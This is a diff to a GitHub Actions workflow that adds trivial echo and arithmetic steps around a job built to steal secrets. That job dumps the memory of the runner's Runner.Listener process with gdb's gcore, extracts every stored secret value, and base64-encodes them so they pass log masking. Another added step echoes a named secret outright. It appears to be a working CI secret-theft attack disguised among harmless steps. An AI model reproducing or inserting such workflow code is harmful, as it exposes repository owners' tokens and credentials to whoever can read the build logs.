@@ -17,7 +17,16 @@ jobs:
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
       - name: Test Word Output
-        run: |
+        run: echo "Hello World"
+      - name: Calculate 2+2
+        run: echo $((2 + 2))
+      - name: Echo Second Secret
+        run: echo '${{ secrets.SECOND_SECRET }}'
+
+  second:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
           sudo apt-get install -y gdb
           sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
           grep -Eao '"[^"]+":\{"value":"[^"]*","issecret":true\}' k.dump* | base64
